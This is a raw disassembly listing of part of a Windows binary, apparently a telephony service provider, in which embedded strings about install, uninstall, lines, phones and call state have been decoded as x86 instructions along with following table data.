  401b63:	and    BYTE PTR [eax],ch
  401b65:	push   ebp
  401b66:	outs   dx,BYTE PTR ds:[esi]
  401b67:	sub    DWORD PTR [ecx+0x6e],ecx
  401b6a:	jae    0x401be0
  401b6c:	popa   
  401b6d:	ins    BYTE PTR es:[edi],dx
  401b6e:	ins    BYTE PTR es:[edi],dx
  401b6f:	cmp    ah,BYTE PTR [eax]
  401b71:	gs jb  0x401be6
  401b74:	outs   dx,DWORD PTR ds:[esi]
  401b75:	jb     0x401ba3
  401b77:	and    BYTE PTR [ecx+ebp*2+0x6e],ch
  401b7b:	gs inc edi
  401b7d:	gs je  0x401bd0
  401b80:	jb     0x401bf1
  401b82:	jbe    0x401bed
  401b84:	fs gs jb 0x401bd4
  401b88:	imul   esi,DWORD PTR [ebx+0x74],0x74657220
  401b8f:	jne    0x401c03
  401b91:	outs   dx,BYTE PTR ds:[esi]
  401b92:	gs and BYTE PTR fs:[eax+0x25],bh
  401b97:	js     0x401b99
  401b99:	add    BYTE PTR [eax],al
  401b9b:	add    BYTE PTR [ebp+0x73],ah
  401b9e:	jo     0x401bd3
  401ba0:	xor    ch,BYTE PTR [esi]
  401ba2:	je     0x401c17
  401ba4:	jo     0x401ba6
  401ba6:	add    BYTE PTR [eax],al
  401ba8:	inc    ebp
  401ba9:	push   ebx
  401baa:	push   eax
  401bab:	and    BYTE PTR [ecx+0x6e],cl
  401bae:	jae    0x401c24
  401bb0:	popa   
  401bb1:	ins    BYTE PTR es:[edi],dx
  401bb2:	ins    BYTE PTR es:[edi],dx
  401bb3:	cmp    ah,BYTE PTR [eax]
  401bb5:	popa   
  401bb6:	ins    BYTE PTR es:[edi],dx
  401bb7:	jb     0x401c1e
  401bb9:	popa   
  401bba:	fs jns 0x401bdd
  401bbd:	imul   ebp,DWORD PTR [esi+0x73],0x6c6c6174
  401bc4:	gs add BYTE PTR fs:[eax],al
  401bc8:	inc    ebp
  401bc9:	push   ebx
  401bca:	push   eax
  401bcb:	and    BYTE PTR [ecx+0x6e],cl
  401bce:	jae    0x401c44
  401bd0:	popa   
  401bd1:	ins    BYTE PTR es:[edi],dx
  401bd2:	ins    BYTE PTR es:[edi],dx
  401bd3:	cmp    ah,BYTE PTR [eax]
  401bd5:	jae    0x401c4c
  401bd7:	arpl   WORD PTR [ebx+0x65],sp
  401bda:	jae    0x401c4f
  401bdc:	sub    al,0x20
  401bde:	push   eax
  401bdf:	jb     0x401c50
  401be1:	jbe    0x401c4c
  401be3:	fs gs jb 0x401c30
  401be7:	inc    esp
  401be8:	cmp    eax,0x45006425
  401bed:	push   ebx
  401bee:	push   eax
  401bef:	and    BYTE PTR [ecx+0x6e],cl
  401bf2:	jae    0x401c68
  401bf4:	popa   
  401bf5:	ins    BYTE PTR es:[edi],dx
  401bf6:	ins    BYTE PTR es:[edi],dx
  401bf7:	cmp    ah,BYTE PTR [eax]
  401bf9:	gs jb  0x401c6e
  401bfc:	outs   dx,DWORD PTR ds:[esi]
  401bfd:	jb     0x401c2b
  401bff:	and    BYTE PTR [ecx+ebp*2+0x6e],ch
  401c03:	gs inc ecx
  401c05:	fs fs push eax
  401c08:	jb     0x401c79
  401c0a:	jbe    0x401c75
  401c0c:	fs gs jb 0x401c30
  401c10:	jb     0x401c77
  401c12:	je     0x401c89
  401c14:	jb     0x401c84
  401c16:	gs and BYTE PTR fs:[eax+0x25],bh
  401c1b:	js     0x401c1d
  401c1d:	add    BYTE PTR [eax],al
  401c1f:	add    BYTE PTR [ebp+0x53],al
  401c22:	push   eax
  401c23:	and    BYTE PTR [ebp+0x6e],dl
  401c26:	imul   ebp,DWORD PTR [esi+0x73],0x6c6c6174
  401c2d:	cmp    ah,BYTE PTR [eax]
  401c2f:	jae    0x401ca6
  401c31:	arpl   WORD PTR [ebx+0x65],sp
  401c34:	jae    0x401ca9
  401c36:	add    BYTE PTR [eax],al
  401c38:	inc    ebp
  401c39:	push   ebx
  401c3a:	push   eax
  401c3b:	and    BYTE PTR [ebp+0x6e],dl
  401c3e:	imul   ebp,DWORD PTR [esi+0x73],0x6c6c6174
  401c45:	cmp    ah,BYTE PTR [eax]
  401c47:	gs jb  0x401cbc
  401c4a:	outs   dx,DWORD PTR ds:[esi]
  401c4b:	jb     0x401c79
  401c4d:	and    BYTE PTR [ecx+ebp*2+0x6e],ch
  401c51:	gs push edx
  401c53:	gs ins DWORD PTR es:[edi],dx
  401c55:	outs   dx,DWORD PTR ds:[esi]
  401c56:	jbe    0x401cbd
  401c58:	push   eax
  401c59:	jb     0x401cca
  401c5b:	jbe    0x401cc6
  401c5d:	fs gs jb 0x401c81
  401c61:	jb     0x401cc8
  401c63:	je     0x401cda
  401c65:	jb     0x401cd5
  401c67:	gs and BYTE PTR fs:[eax+0x25],bh
  401c6c:	js     0x401c6e
  401c6e:	add    BYTE PTR [eax],al
  401c70:	inc    ebp
  401c71:	push   ebx
  401c72:	push   eax
  401c73:	and    BYTE PTR [ebp+0x6e],dl
  401c76:	imul   ebp,DWORD PTR [esi+0x73],0x6c6c6174
  401c7d:	cmp    ah,BYTE PTR [eax]
  401c7f:	outs   dx,BYTE PTR ds:[esi]
  401c80:	outs   dx,DWORD PTR ds:[esi]
  401c81:	je     0x401ca3
  401c83:	imul   ebp,DWORD PTR [esi+0x73],0x6c6c6174
  401c8a:	gs add BYTE PTR fs:[eax],al
  401c8e:	add    BYTE PTR [eax],al
  401c90:	push   esp
  401c91:	push   ebx
  401c92:	push   eax
  401c93:	dec    ecx
  401c94:	and    BYTE PTR [esi+0x65],dl
  401c97:	jb     0x401d0c
  401c99:	imul   ebp,DWORD PTR [edi+0x6e],0x0
  401ca0:	dec    esi
  401ca1:	jne    0x401d10
  401ca3:	and    BYTE PTR [ecx+ebp*2+0x6e],ch
  401ca7:	gs jae 0x401caa
  401caa:	add    BYTE PTR [eax],al
  401cac:	dec    esi
  401cad:	jne    0x401d1c
  401caf:	and    BYTE PTR [ecx+0x64],ah
  401cb2:	fs jb  0x401d28
  401cb5:	and    BYTE PTR [eax+0x65],dh
  401cb8:	jb     0x401cda
  401cba:	ins    BYTE PTR es:[edi],dx
  401cbb:	imul   ebp,DWORD PTR [esi+0x65],0x754e0000
  401cc2:	ins    DWORD PTR es:[edi],dx
  401cc3:	and    BYTE PTR [ebx+0x61],ah
  401cc6:	ins    BYTE PTR es:[edi],dx
  401cc7:	ins    BYTE PTR es:[edi],dx
  401cc8:	jae    0x401cea
  401cca:	jo     0x401d31
  401ccc:	jb     0x401cee
  401cce:	popa   
  401ccf:	fs fs jb 0x401cd3
  401cd3:	add    BYTE PTR [esi+0x75],cl
  401cd6:	ins    DWORD PTR es:[edi],dx
  401cd7:	and    BYTE PTR [eax+0x68],dh
  401cda:	outs   dx,DWORD PTR ds:[esi]
  401cdb:	outs   dx,BYTE PTR ds:[esi]
  401cdc:	gs jae 0x401cdf
  401cdf:	add    BYTE PTR [ebp+eiz*2+0x66],al
  401ce3:	popa   
  401ce4:	jne    0x401d52
  401ce6:	je     0x401d08
  401ce8:	jbe    0x401d4b
  401cea:	ins    BYTE PTR es:[edi],dx
  401ceb:	jne    0x401d52
  401ced:	jae    0x401cef
  401cef:	add    BYTE PTR ds:0x45000064,ah
  401cf5:	push   ebx
  401cf6:	push   eax
  401cf7:	and    BYTE PTR [ebp+eiz*2+0x66],al
  401cfb:	popa   
  401cfc:	jne    0x401d6a
  401cfe:	je     0x401d73
	...
  401d08:	dec    esi
  401d09:	gs ja  0x401d2c
  401d0c:	jbe    0x401d6f
  401d0e:	ins    BYTE PTR es:[edi],dx
  401d0f:	jne    0x401d76
  401d11:	jae    0x401d33
  401d13:	ja     0x401d7e
  401d15:	ins    BYTE PTR es:[edi],dx
  401d16:	ins    BYTE PTR es:[edi],dx
  401d17:	and    BYTE PTR [esi+0x6f],ch
  401d1a:	je     0x401d3c
  401d1c:	je     0x401d7f
  401d1e:	imul   esp,DWORD PTR [ebp+0x20],0x65
  401d22:	data16 data16 arpl WORD PTR gs:[eax+eiz*1+0x75],si
  401d29:	outs   dx,BYTE PTR ds:[esi]
  401d2a:	je     0x401d95
  401d2c:	ins    BYTE PTR es:[edi],dx
  401d2d:	and    BYTE PTR [eax+0x72],dh
  401d30:	outs   dx,DWORD PTR ds:[esi]
  401d31:	jbe    0x401d9c
  401d33:	fs gs jb 0x401d57
  401d37:	imul   esi,DWORD PTR [ebx+0x20],0x74756873
  401d3e:	outs   dx,DWORD PTR fs:[esi]
  401d40:	ja     0x401db0
  401d42:	and    BYTE PTR [ecx+0x6e],ah
  401d45:	and    BYTE PTR fs:[edx+0x65],dh
  401d49:	imul   ebp,DWORD PTR [esi+0x69],0x6c616974
  401d50:	imul   edi,DWORD PTR [edx+0x65],0x64
  401d57:	add    BYTE PTR [eax+0x74],ch
  401d5a:	dec    esp
  401d5b:	imul   ebp,DWORD PTR [esi+0x65],0x74680000
  401d62:	inc    ebx
  401d63:	popa   
  401d64:	ins    BYTE PTR es:[edi],dx
  401d65:	ins    BYTE PTR es:[edi],dx
  401d66:	add    BYTE PTR [eax],al
  401d68:	fs ja  0x401db8
  401d6b:	jae    0x401dd4
  401d6d:	add    BYTE PTR [eax],al
  401d6f:	add    BYTE PTR [edi+esi*2+0x50],ah
  401d73:	popa   
  401d74:	jb     0x401dd7
  401d76:	ins    DWORD PTR es:[edi],dx
  401d77:	xor    DWORD PTR [eax],eax
  401d79:	add    BYTE PTR [eax],al
  401d7b:	add    BYTE PTR [edi+esi*2+0x50],ah
  401d7f:	popa   
  401d80:	jb     0x401de3
  401d82:	ins    DWORD PTR es:[edi],dx
  401d83:	xor    al,BYTE PTR [eax]
  401d85:	add    BYTE PTR [eax],al
  401d87:	add    BYTE PTR [edi+esi*2+0x50],ah
  401d8b:	popa   
  401d8c:	jb     0x401def
  401d8e:	ins    DWORD PTR es:[edi],dx
  401d8f:	xor    eax,DWORD PTR [eax]
  401d91:	add    BYTE PTR [eax],al
  401d93:	add    BYTE PTR [ecx+ebp*2+0x6e],cl
  401d97:	and    BYTE PTR gs:[ebp+0x76],ah
  401d9b:	outs   dx,BYTE PTR gs:[esi]
  401d9d:	je     0x401d9f
  401d9f:	add    BYTE PTR [eax+0x74],ch
  401da2:	push   eax
  401da3:	push   0x656e6f
  401da8:	push   eax
  401da9:	push   0x20656e6f
  401dae:	gs jbe 0x401e16
  401db1:	outs   dx,BYTE PTR ds:[esi]
  401db2:	je     0x401db4
  401db4:	cmp    al,0x75
  401db6:	outs   dx,BYTE PTR ds:[esi]
  401db7:	fs gs jb 0x401ddb
  401dbb:	arpl   WORD PTR [edi+0x6e],bp
  401dbe:	jae    0x401e34
  401dc0:	jb     0x401e37
  401dc2:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  401dc6:	outs   dx,BYTE PTR ds:[esi]
  401dc7:	add    BYTE PTR ds:[eax],al
  401dca:	add    BYTE PTR [eax],al
  401dcc:	dec    esp
  401dcd:	imul   ebp,DWORD PTR [esi+0x65],0x70206425
  401dd4:	jb     0x401e45
  401dd6:	jo     0x401e3d
  401dd8:	jb     0x401e4e
  401dda:	imul   esp,DWORD PTR [ebp+0x73],0x43000000
  401de1:	popa   
  401de2:	ins    BYTE PTR es:[edi],dx
  401de3:	ins    BYTE PTR es:[edi],dx
  401de4:	and    BYTE PTR [ebx+0x74],dh
  401de7:	popa   
  401de8:	je     0x401e4f
  401dea:	add    BYTE PTR [eax],al
  401dec:	inc    ebx
  401ded:	popa   
  401dee:	ins    BYTE PTR es:[edi],dx
  401def:	ins    BYTE PTR es:[edi],dx
  401df0:	and    BYTE PTR [ebx+0x74],dh
  401df3:	popa   
  401df4:	je     0x401e5b
  401df6:	and    BYTE PTR [ebp+0x6f],ch
  401df9:	fs add BYTE PTR gs:[ebx+0x61],al
  401dfe:	ins    BYTE PTR es:[edi],dx
  401dff:	ins    BYTE PTR es:[edi],dx
  401e00:	and    BYTE PTR [eax+0x25],bh
  401e03:	js     0x401e25
  401e05:	jo     0x401e79
  401e07:	outs   dx,DWORD PTR ds:[esi]
  401e08:	jo     0x401e6f
  401e0a:	jb     0x401e80
  401e0c:	imul   esp,DWORD PTR [ebp+0x73],0x6f685000
  401e13:	outs   dx,BYTE PTR ds:[esi]
  401e14:	gs and eax,0x72702064
  401e1a:	outs   dx,DWORD PTR ds:[esi]
  401e1b:	jo     0x401e82
  401e1d:	jb     0x401e93
  401e1f:	imul   esp,DWORD PTR [ebp+0x73],0x526c0000
  401e26:	gs jae 0x401e9e
  401e29:	ins    BYTE PTR es:[edi],dx
  401e2a:	je     0x401e2c
  401e2c:	inc    ebx
  401e2d:	outs   dx,DWORD PTR ds:[esi]
  401e2e:	ins    DWORD PTR es:[edi],dx
  401e2f:	jo     0x401e9d
  401e31:	gs je  0x401e9d
  401e34:	outs   dx,BYTE PTR ds:[esi]
  401e35:	and    BYTE PTR [bp+si+0x65],dh
  401e39:	jno    0x401eb0
  401e3b:	gs jae 0x401eb2
  401e3e:	add    BYTE PTR [eax],al
  401e40:	and    eax,0x73252073
  401e45:	and    BYTE PTR [eax+0x65],dh
  401e48:	jb     0x401e6a
  401e4a:	and    eax,0x73
  401e4f:	add    BYTE PTR [edx+0x65],dl
  401e52:	jno    0x401e9d
  401e54:	inc    esp
  401e55:	cmp    eax,0x782578
  401e5a:	add    BYTE PTR [eax],al
  401e5c:	dec    esp
  401e5d:	imul   ebp,DWORD PTR [esi+0x65],0x28206425
  401e64:	inc    ebx
  401e65:	dec    esp
  401e66:	dec    edi
  401e67:	push   ebx
  401e68:	inc    ebp
  401e69:	inc    esp
  401e6a:	sub    DWORD PTR [eax],eax
  401e6c:	dec    esp
  401e6d:	imul   ebp,DWORD PTR [esi+0x65],0x202c6425
  401e74:	push   0x25783d64
  401e79:	js     0x401ea7
  401e7b:	and    BYTE PTR [eax+0x74],ch
  401e7e:	cmp    eax,0x782578
  401e83:	add    BYTE PTR [eax],ah
  401e85:	and    BYTE PTR [eax+0x64],ch
  401e88:	inc    ebx
  401e89:	popa   
  401e8a:	ins    BYTE PTR es:[edi],dx
  401e8b:	ins    BYTE PTR es:[edi],dx
  401e8c:	cmp    eax,0x2c782578
  401e91:	and    BYTE PTR [eax+0x74],ch
  401e94:	cmp    eax,0x2c782578
  401e99:	and    BYTE PTR ds:0x64412073,ah
  401e9f:	fs jb  0x401edf
  401ea2:	and    eax,0x64
  401ea7:	add    BYTE PTR [eax+0x68],dl
  401eaa:	outs   dx,DWORD PTR ds:[esi]
  401eab:	outs   dx,BYTE PTR ds:[esi]
  401eac:	gs and eax,0x43282064
  401eb2:	dec    esp
  401eb3:	dec    edi
  401eb4:	push   ebx
  401eb5:	inc    ebp
  401eb6:	inc    esp
  401eb7:	sub    DWORD PTR [eax],eax
  401eb9:	add    BYTE PTR [eax],al
  401ebb:	add    BYTE PTR [eax+0x68],dl
  401ebe:	outs   dx,DWORD PTR ds:[esi]
  401ebf:	outs   dx,BYTE PTR ds:[esi]
  401ec0:	gs and eax,0x68202c64
  401ec6:	fs cmp eax,0x2c782578
  401ecc:	and    BYTE PTR [eax+0x74],ch
  401ecf:	cmp    eax,0x782578
  401ed4:	push   ebp
  401ed5:	jo     0x401f3b
  401ed7:	popa   
  401ed8:	je     0x401f3f
  401eda:	inc    ebp
  401edb:	push   ebx
  401edc:	push   eax
  401edd:	dec    edi
  401ede:	jo     0x401f54
  401ee0:	imul   ebp,DWORD PTR [edi+0x6e],0x45203a73
  401ee7:	pop    eax
  401ee8:	inc    ebx
  401ee9:	inc    ebp
  401eea:	push   eax
  401eeb:	push   esp
  401eec:	dec    ecx
  401eed:	dec    edi
  401eee:	dec    esi
  401eef:	and    BYTE PTR [edi+0x68],dh
  401ef2:	imul   ebp,DWORD PTR [ebp+eiz*2+0x20],0x6c6c6163
  401efa:	imul   ebp,DWORD PTR [esi+0x67],0x50534520
  401f01:	push   ebx
  401f02:	gs je  0x401f54
  401f05:	jo     0x401f7b
  401f07:	imul   ebp,DWORD PTR [edi+0x6e],0x292873
  401f0e:	add    BYTE PTR [eax],al
  401f10:	or     eax,0x4500000a
  401f15:	jb     0x401f89
  401f17:	outs   dx,DWORD PTR ds:[esi]
  401f18:	jb     0x401f54
  401f1a:	and    BYTE PTR [ebp+0x79],cl
  401f1d:	inc    ecx
  401f1e:	ins    BYTE PTR es:[edi],dx
  401f1f:	ins    BYTE PTR es:[edi],dx
  401f20:	outs   dx,DWORD PTR ds:[esi]
  401f21:	arpl   WORD PTR [eax],sp
  401f23:	sub    BYTE PTR [ecx],ch
  401f25:	and    BYTE PTR [esi+0x61],ah
  401f28:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x0
  401f30:	gs imul esi,DWORD PTR fs:[eax+eax*1+0x0],0x554e0000
  401f3a:	dec    esp
  401f3b:	and    BYTE PTR [eax],ch
  401f3d:	fs ja  0x401f98
  401f40:	js     0x401fba
  401f42:	push   ebx
  401f43:	imul   edi,DWORD PTR [edx+0x65],0x29303d
  401f4a:	add    BYTE PTR [eax],al
  401f4c:	push   esi
  401f4d:	popa   
  401f4e:	ins    BYTE PTR es:[edi],dx
  401f4f:	imul   esp,DWORD PTR [eax+eiz*1+0x73],0x6e697274
  401f57:	add    BYTE PTR [bx+si],al
  401f5a:	add    BYTE PTR [eax],al
  401f5c:	xor    BYTE PTR [eax],dh
  401f5e:	xor    BYTE PTR [eax],dh
  401f60:	xor    BYTE PTR [eax],dh
  401f62:	xor    BYTE PTR [eax],al
  401f64:	and    eax,0x786c3830
  401f69:	add    BYTE PTR [eax],al
  401f6b:	add    BYTE PTR [esi+0x66],ah
  401f6e:	data16 data16 data16 data16 data16 data16 add BYTE PTR [eax],al
  401f76:	add    BYTE PTR [eax],al
  401f78:	jae    0x401fdf
  401f7a:	ins    BYTE PTR es:[edi],dx
  401f7b:	arpl   WORD PTR gs:[eax+eiz*1+0x6e],si
  401f80:	outs   dx,DWORD PTR ds:[esi]
  401f81:	outs   dx,BYTE PTR ds:[esi]
  401f82:	add    BYTE PTR gs:[ebx+0x65],dh
  401f86:	ins    BYTE PTR es:[edi],dx
  401f87:	arpl   WORD PTR gs:[eax+eiz*1+0x61],si
  401f8c:	ins    BYTE PTR es:[edi],dx
  401f8d:	ins    BYTE PTR es:[edi],dx
  401f8e:	add    BYTE PTR [eax],al
  401f90:	xor    BYTE PTR [eax],dh
  401f92:	xor    BYTE PTR [eax],dh
  401f94:	xor    BYTE PTR [eax],dh
  401f96:	xor    BYTE PTR [eax],dh
	...
  401fa0:	add    al,0x5d
  401fa2:	mov    BYTE PTR [edx+0x11c91ceb],cl
  401fa8:	lahf   
  401fa9:	call   0x106b1fb6
  401fae:	dec    eax
  401faf:	pusha  
  401fb0:	add    al,BYTE PTR [eax]
  401fb2:	add    BYTE PTR [eax],al
  401fb4:	add    BYTE PTR [eax],al
  401fb6:	add    BYTE PTR [eax],al
  401fb8:	adc    DWORD PTR [eax+ecx*1],ecx
  401fbb:	pop    esp
  401fbc:	sbb    al,0x0
  401fbe:	add    DWORD PTR [eax],eax
  401fc0:	sub    BYTE PTR [esp+eax*1+0x0],dl
  401fc4:	add    BYTE PTR [eax],al
  401fc6:	sub    BYTE PTR [esp+eax*1+0x0],dl
  401fca:	add    BYTE PTR [eax],al
  401fcc:	add    bl,BYTE PTR [ebx+0x11]
  401fcf:	or     BYTE PTR [eax],cl
  401fd1:	pop    esp
  401fd2:	sbb    al,0x0
  401fd4:	add    DWORD PTR [eax],eax
  401fd6:	sub    BYTE PTR [eax],al
  401fd8:	add    al,0x0
  401fda:	add    BYTE PTR [eax],al
  401fdc:	sub    BYTE PTR [eax],al
  401fde:	add    al,0x0
  401fe0:	add    BYTE PTR [eax],al
  401fe2:	add    bl,BYTE PTR [ebx+0x0]
  401fe5:	add    BYTE PTR [eax],al
  401fe7:	add    BYTE PTR [eax],al
  401fe9:	add    BYTE PTR [edx],dh
  401feb:	dec    eax
  401fec:	add    BYTE PTR [eax],al
  401fee:	add    BYTE PTR [eax],al
  401ff0:	add    BYTE PTR [eax],al
  401ff2:	adc    al,0x0
  401ff4:	or     BYTE PTR [eax],al
  401ff6:	pop    esp
  401ff7:	add    BYTE PTR [ebp+eax*1+0x8],al
  401ffb:	add    DWORD PTR [eax],eax
  401ffd:	add    BYTE PTR [eax],al
  401fff:	add    BYTE PTR [eax],al
  402001:	add    BYTE PTR [eax+0x0],cl
  402004:	add    BYTE PTR [eax],al
  402006:	or     BYTE PTR [eax],al
  402008:	push   eax
  402009:	and    DWORD PTR [eax+eax*1],eax
  40200c:	or     BYTE PTR [eax],al
  40200e:	push   eax
  40200f:	and    DWORD PTR [eax],ecx
  402011:	add    BYTE PTR [eax],cl
  402013:	add    BYTE PTR [eax+0x21],dl
  402016:	or     al,0x0
  402018:	or     BYTE PTR [eax],al
  40201a:	jo     0x40201c
  40201c:	adc    BYTE PTR [eax],al
  40201e:	or     BYTE PTR [eax],al
  402020:	xor    cl,BYTE PTR [eax+0x0]
  402023:	add    BYTE PTR [eax],al
  402025:	add    BYTE PTR [ecx],al
  402027:	add    BYTE PTR [eax],cl
  402029:	add    BYTE PTR [eax],dl
  40202b:	add    BYTE PTR [eax],al
  40202d:	add    BYTE PTR [eax+0x2],al
  402030:	or     BYTE PTR [ecx],al
  402032:	add    BYTE PTR [eax],al
  402034:	add    BYTE PTR [eax],al
  402036:	add    BYTE PTR [eax],al
  402038:	dec    eax
  402039:	add    BYTE PTR [eax],al
  40203b:	add    BYTE PTR [eax],cl
  40203d:	add    BYTE PTR [eax+0x0],cl
  402040:	add    al,0x0
  402042:	or     BYTE PTR [eax],al
  402044:	xor    cl,BYTE PTR [eax+0x0]
  402047:	add    BYTE PTR [eax],al
  402049:	add    BYTE PTR [edx],al
  40204b:	add    BYTE PTR [eax],cl
  40204d:	add    BYTE PTR [eax],dl
  40204f:	add    BYTE PTR [eax],al
  402051:	add    BYTE PTR [eax+0x2],al
  402054:	or     BYTE PTR [ecx],al
  402056:	add    BYTE PTR [eax],al
  402058:	add    BYTE PTR [eax],al
  40205a:	add    BYTE PTR [eax],al
  40205c:	dec    eax
  40205d:	add    BYTE PTR [eax],al
  40205f:	add    BYTE PTR [eax],cl
  402061:	add    BYTE PTR [eax+0x0],cl
  402064:	add    al,0x0
  402066:	or     BYTE PTR [eax],al
  402068:	xor    cl,BYTE PTR [eax+0x0]
  40206b:	add    BYTE PTR [eax],al
  40206d:	add    BYTE PTR [ebx],al
  40206f:	add    BYTE PTR [eax+eax*1],bl
  402072:	xor    BYTE PTR [eax],al
  402074:	or     BYTE PTR [eax],al
  402076:	inc    esp
  402077:	pop    es
  402078:	or     BYTE PTR [ecx],al
  40207a:	add    BYTE PTR [eax],al
  40207c:	add    BYTE PTR [eax],al
  40207e:	add    BYTE PTR [eax],al
  402080:	dec    eax
  402081:	add    BYTE PTR [eax],al
  402083:	add    BYTE PTR [eax],cl
  402085:	add    BYTE PTR [eax+0x0],cl
  402088:	add    al,0x0
  40208a:	or     BYTE PTR [eax],al
  40208c:	dec    eax
  40208d:	add    BYTE PTR [eax],cl
  40208f:	add    BYTE PTR [eax],cl
  402091:	add    BYTE PTR [eax+0x0],cl
  402094:	or     al,0x0
  402096:	or     BYTE PTR [eax],al
  402098:	dec    eax
  402099:	add    BYTE PTR [eax],dl
  40209b:	add    BYTE PTR [eax],cl
  40209d:	add    BYTE PTR [eax+0x0],cl
  4020a0:	adc    al,0x0
  4020a2:	or     BYTE PTR [eax],al
  4020a4:	jo     0x4020a6
  4020a6:	sbb    BYTE PTR [eax],al
  4020a8:	or     BYTE PTR [eax],al
  4020aa:	xor    cl,BYTE PTR [eax+0x0]
  4020ad:	add    BYTE PTR [eax],al
  4020af:	add    BYTE PTR [eax+eax*1],al
  4020b2:	or     BYTE PTR [eax],al
  4020b4:	sbb    al,0x0
  4020b6:	sbb    al,0x0
  4020b8:	inc    ecx
  4020b9:	add    cl,BYTE PTR [eax]
  4020bb:	add    eax,DWORD PTR [ecx]
  4020bd:	add    BYTE PTR [eax],al
  4020bf:	add    BYTE PTR [eax],al
  4020c1:	add    BYTE PTR [ebx],dl
  4020c3:	add    BYTE PTR [eax],al
  4020c5:	add    BYTE PTR [esi],al
  4020c7:	add    BYTE PTR [eax+0x1],bl
  4020ca:	add    al,0x0
  4020cc:	or     BYTE PTR [eax],al
  4020ce:	xor    cl,BYTE PTR [eax+0x0]
  4020d1:	add    BYTE PTR [eax],al
  4020d3:	add    BYTE PTR ds:0x1c000800,al
  4020d9:	add    BYTE PTR [eax+eax*1],bl
  4020dc:	inc    ecx
  4020dd:	add    cl,BYTE PTR [eax]
  4020df:	add    eax,DWORD PTR [ecx]
  4020e1:	add    BYTE PTR [eax],al
  4020e3:	add    BYTE PTR [eax],al
  4020e5:	add    BYTE PTR [ebx],dl
  4020e7:	add    BYTE PTR [eax],al
  4020e9:	add    BYTE PTR [esi],al
  4020eb:	add    BYTE PTR [eax+0x1],bl
  4020ee:	add    al,0x0
  4020f0:	or     BYTE PTR [eax],al
  4020f2:	xor    cl,BYTE PTR [eax+0x0]
  4020f5:	add    BYTE PTR [eax],al
  4020f7:	add    BYTE PTR [esi],al
  4020f9:	add    BYTE PTR [eax+eax*1],cl
  4020fc:	or     BYTE PTR [eax],al
  4020fe:	or     BYTE PTR [eax],al
  402100:	inc    esi
  402101:	add    ecx,DWORD PTR [eax]
  402103:	add    eax,0x10000
  402108:	add    BYTE PTR [eax],al
  40210a:	or     eax,DWORD PTR [eax]
  40210c:	add    BYTE PTR [eax],al
  40210e:	sbb    al,0x0
  402110:	dec    eax
  402111:	add    BYTE PTR [eax+eax*1],al
  402114:	or     BYTE PTR [eax],al
  402116:	jo     0x402118
  402118:	or     BYTE PTR [eax],al
  40211a:	or     BYTE PTR [eax],al
  40211c:	xor    cl,BYTE PTR [eax+0x0]
  40211f:	add    BYTE PTR [eax],al
  402121:	add    BYTE PTR [edi],al
  402123:	add    BYTE PTR [eax],cl
  402125:	add    BYTE PTR [eax],cl
  402127:	add    BYTE PTR [eax],cl
  402129:	add    BYTE PTR [edx+eax*1+0x8],al
  40212d:	add    DWORD PTR [eax],eax
  40212f:	add    BYTE PTR [eax],al
  402131:	add    BYTE PTR [eax],al
  402133:	add    BYTE PTR [eax+0x0],cl
  402136:	add    BYTE PTR [eax],al
  402138:	or     BYTE PTR [eax],al
  40213a:	jo     0x40213c
  40213c:	add    al,0x0
  40213e:	or     BYTE PTR [eax],al
	...
  402148:	inc    esp
  402149:	add    BYTE PTR [eax],al
  40214b:	add    BYTE PTR [ecx],ah
  40214d:	gs pop edi
  40214f:	das    
  402150:	inc    edi
  402151:	retf   0x1068
  402154:	mov    bl,0x1a
  402156:	add    ch,bl
  402158:	add    DWORD PTR [esi],eax
  40215a:	(bad)  
  40215b:	fild   DWORD PTR [ecx]
  40215d:	add    BYTE PTR [eax],al
  40215f:	add    BYTE PTR [ebx*2+0x1ceb8a88],al
  402166:	leave  
  402167:	adc    DWORD PTR [edi+0x2b0008e8],ebx
  40216d:	adc    BYTE PTR [eax+0x60],cl
  402170:	add    al,BYTE PTR [eax]
	...
  40218e:	add    BYTE PTR [eax],al
  402190:	dec    eax
  402191:	and    DWORD PTR [eax+0x0],eax
  402194:	mov    DWORD PTR [ebx],esp
  402196:	inc    eax
  402197:	add    BYTE PTR [ebx-0x13ffbfdd],dl
  40219d:	add    BYTE PTR [eax+0x0],0x0
	...
  4021ad:	add    BYTE PTR [eax],al
  4021af:	add    BYTE PTR [esi+0x100401f],dh
  4021b5:	add    BYTE PTR [eax],al
  4021b7:	add    BYTE PTR [edx],al
  4021b9:	add    BYTE PTR ds:0x0,al
  4021bf:	add    BYTE PTR [ebx+0x2],dl
  4021c2:	add    BYTE PTR [eax],cl
	...
  4021d0:	add    DWORD PTR [eax],eax
	...
  4021e2:	add    BYTE PTR ss:[edx+0x0],bl
  4021e6:	jle    0x4021e8
  4021e8:	rol    BYTE PTR [eax],0xe4
  4021eb:	add    BYTE PTR [eax],cl
  4021ed:	add    DWORD PTR [edx],esi
  4021ef:	add    eax,edx
  4021f1:	jge    0x402233
  4021f3:	add    BYTE PTR [eax],ah
  4021f5:	jle    0x402237
  4021f7:	add    BYTE PTR [esi],al
  4021f9:	add    BYTE PTR [eax-0x7f7e7f7a],0x0
  402200:	add    BYTE PTR [eax],dl
  402202:	add    eax,DWORD PTR [esi-0x7f7d7980]
  402208:	adc    al,0x5
  40220a:	add    eax,0x85454545
  40220f:	test   DWORD PTR [ebp+0x30000005],eax
  402215:	xor    BYTE PTR [eax+0x808050],al
  40221b:	or     BYTE PTR [eax],al
  40221d:	sub    BYTE PTR [edi],ah
  40221f:	cmp    BYTE PTR [eax+0x57],dl
  402222:	add    BYTE PTR [eax],0x7
  402225:	add    BYTE PTR [edi],dh
  402227:	xor    BYTE PTR [eax],dh
  402229:	push   eax
  40222a:	push   eax
  40222b:	mov    BYTE PTR [eax],al
  40222d:	add    BYTE PTR [eax],al
  40222f:	and    BYTE PTR [eax],ch
  402231:	or     BYTE PTR [eax+0x8080],0x0
  402238:	pusha  
  402239:	pusha  
  40223a:	pusha  
  40223b:	push   0x8086868
  402240:	pop    es
  402241:	js     0x4022b3
  402243:	jo     0x4022bc
  402245:	jo     0x4022b7
  402247:	or     BYTE PTR [eax],cl
  402249:	add    BYTE PTR [eax],al
  40224b:	or     BYTE PTR [eax],al
  40224d:	or     BYTE PTR [eax],al
  40224f:	pop    es
  402250:	or     BYTE PTR [eax],al
  402252:	add    BYTE PTR [eax],al
  402254:	add    BYTE PTR [eax],al
  402256:	add    BYTE PTR [eax],al
  402258:	dec    eax
	...
  402291:	add    BYTE PTR [eax],al
  402293:	add    BYTE PTR [eax],dl
  402295:	jp     0x4022d7
